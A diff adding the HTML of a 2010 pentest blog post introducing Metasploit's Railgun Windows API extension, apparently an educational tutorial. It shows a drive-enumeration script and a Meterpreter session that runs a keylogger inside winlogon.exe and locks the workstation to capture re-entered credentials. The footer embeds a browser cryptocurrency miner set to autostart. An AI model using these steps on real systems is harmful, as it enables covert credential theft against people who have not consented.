@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title> Intro to RailGun: WIN API for Meterpreter &middot;  </title>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.41" />
+
+
+<script   src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://malicious.link/css/nix.css">
+
+
+<link href="https://fonts.googleapis.com/css?family=Inconsolata|Open+Sans|Roboto|Montserrat|Concert+One" rel="stylesheet">
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+				  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-198967-1', 'auto');
+	  ga('send', 'pageview');
+
+</script>
+
+
+    </head>
+
+    <body>
+        <header>
+<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			<a class="navbar-brand" id="green-terminal" href=https://malicious.link/>mubix@malicious.link ~ $</a>
+		</div>
+
+		
+		<div class="collapse navbar-collapse" id="navbar-collapse-1">
+			<ul class="nav navbar-nav navbar-right">
+				<li>
+					<a href="https://malicious.link/">/home/mubix</a>
+				</li>
+
+				
+				
+				<li >
+					<a href="/brandon">~/brandon</a>
+				</li>
+				
+				
+				<li >
+					<a href="/about">~/about</a>
+				</li>
+				
+				
+				<li >
+					<a href="/post">~/posts</a>
+				</li>
+				
+
+			</ul>
+		</div>
+	</div>
+</nav>
+</header>
+
+        <div class="container wrapper">
+            <h1><a href="https://malicious.link/post/2010/2010-07-08-intro-to-railgun-win-api-for-meterpreter/">Intro to RailGun: WIN API for Meterpreter</a></h1>
+            <span class="post-date">Jul 8, 2010 </span>
+            <div class="post-content">
+                
+
+<p>Back on June 13th, &ldquo;Patrick HVE&rdquo; released RAILGUN:</p>
+
+<p><a href="http://mail.metasploit.com/pipermail/framework/2010-June/006382.html">http://mail.metasploit.com/pipermail/framework/2010-June/006382.html</a></p>
+
+<p>And it was merged into the the Metasploit trunk with 9709, 9710, 9711 and 9712:
+<a href="http://www.metasploit.com/redmine/projects/framework/repository/revisions/9712">http://www.metasploit.com/redmine/projects/framework/repository/revisions/9712</a></p>
+
+<p>Basically what this allows you to do is make Windows API calls from Meterpreter without compiling your own DLL. It currently supports a number of Windows API dlls:</p>
+
+<ul>
+<li>iphlpapi</li>
+<li>ws2_32</li>
+<li>kernel32</li>
+<li>ntdll</li>
+<li>user32</li>
+<li>advapi32</li>
+</ul>
+
+<p>(You can find out exactly what functions are available by default in the api.rb file)</p>
+
+<p>It&rsquo;s also very extensible, it doesn&rsquo;t have a DLL or function you need? But you can read all about in the manual:</p>
+
+<p><code>./external/source/meterpreter/source/extensions/railgun/railgun_manual.pdf</code></p>
+
+<p>Here are two examples where this comes in very handy:</p>
+
+<h2 id="list-drives">List Drives:</h2>
+
+<p>The problem that I&rsquo;ve had on a number of pentests is that you get shell, but from CMD or Meterpreter there is no good way to find all of the volumes (drives) attached.</p>
+
+<ul>
+<li>net use - Shows you what Network drives are connected, but not physical ones</li>
+<li>fsutil fsinfo drives - You must be an administrator to ride this train</li>
+<li>fdisk /status - Only on OLD versions of DOS, not sure when this disappeared</li>
+</ul>
+
+<p>But railgun solves this problem with a really short script:</p>
+
+<pre><code class="language-ruby"># Load the Railgun plugin  **_Update: You no longer need this step_**  
+# client.core.use(&quot;railgun&quot;)   
+# Make the API call to enum drive letters   
+a = client.railgun.kernel32.GetLogicalDrives()[&quot;return&quot;]         
+# Math magic to convert the binary to letters        
+drives = []         
+letters = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;         
+(0..25).each do |i|        
+	test = letters[i,1]        
+	rem = a % (2**(i+1))        
+	if rem &gt; 0        
+		drives &lt;&lt; test        
+		a = a - rem        
+	end        
+end         
+print_line(&quot;Drives Available = #{drives.inspect}&quot;)
+</code></pre>
+
+<p><strong>Output</strong>: <code>Drives Available = [&quot;A&quot;, &quot;C&quot;, &quot;D&quot;, &quot;P&quot;, &quot;X&quot;]</code></p>
+
+<p>Save this as a meterpreter script and it&rsquo;ll print every logical drive attached to the system even as a limited user (that the user can see).</p>
+
+<p>Logical drives include: (hdd, network, mass storage, optical, etc). This opens up the doors to infecting USB sticks and network drives…</p>
+
+<h2 id="jedi-keylogging">JEDI KEYLOGGING:</h2>
+
+<p>One of the problems with keylogging is you never know when that person will log in, and if you&rsquo;re using a client side, they have probably already logged in and you&rsquo;re hoping they log into a portal or some other password protected site.</p>
+
+<p>Railgun to the rescue again:</p>
+
+<pre><code class="language-ruby"># Start the keylogger running in the background dumping keys every 15 seconds, attached to Winlogon**   
+
+meterpreter &gt; bgrun keylogrecorder -c 1 -t 15        
+[*] Executed Meterpreter with Job ID 0        
+meterpreter &gt; [*] winlogon.exe Process found, migrating into 640        
+[*] Migration Successful!!        
+[*] Starting the keystroke sniffer...        
+[*] Keystrokes being saved in to /root/.msf3/logs/scripts/keylogrecorder/192.168.92.122_20100707.4539.txt        
+[*] Recording         
+  
+# Drop to IRB to initialize railgun and lockout the workstation, forcing the user to use their credentials again.**
+
+meterpreter &gt; irb       
+[*] Starting IRB shell        
+[*] The 'client' variable holds the meterpreter client
+
+client.core.use(&quot;railgun&quot;)       
+=&gt; true        
+client.railgun.user32.LockWorkStation()        
+=&gt; {&quot;GetLastError&quot;=&gt;0, &quot;return&quot;=&gt;true}        
+exit        
+meterpreter &gt;
+</code></pre>
+
+<p>Set up &ldquo;tail -f&rdquo; going on the log file for the keylogger and then kill the keylogger when you&rsquo;ve gotten what you came for.</p>
+
+<pre><code>meterpreter &gt; bglist       
+[*] Job 0: [&quot;keylogrecorder&quot;, &quot;-c&quot;, &quot;1&quot;, &quot;-t&quot;, &quot;15&quot;]        
+meterpreter &gt; bgkill 0        
+[*] Killing background job 0...        
+meterpreter &gt;
+</code></pre>
+
+<p>Hope you have fun with railgun and shoot me an email <a href="mailto:mubix@hak5.org">mubix@hak5.org</a> or leave a comment if you have any other crazy uses for railgun.</p>
+
+            </div>
+            
+            <div class="post-comments">
+                
+            </div>
+            
+            <div class="push"></div>
+        </div>
+        <footer class="footer text-center">
+<p>
+	<center>
+	<b>If you wish to support this blog, please consider clicking start for a little bit. Thanks!</b>
+	<br />
+	<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
+	<div class="coinhive-miner"
+	style="width: 800px; height: 80px"
+	data-key="Fq2psjl0HfUkdM4LuKrCulHymNpmFuXb"
+	data-whitelabel="true"
+	data-text="#000000"
+	data-background="#F5F5F5"
+	data-user="blog"
+	data-autostart="true"
+	>
+	<em>Loading...</em>
+	</div>
+	</center>
+</p>
+<p>Copyright &copy; 2018 Malicious.Link -
+<span class="credit">
+	Powered by
+	<a target="_blank" href="https://gohugo.io">Hugo</a>
+	and
+	<a target="_blank" href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme.
+</span>
+</p>
+
+</footer>
+
+    </body>
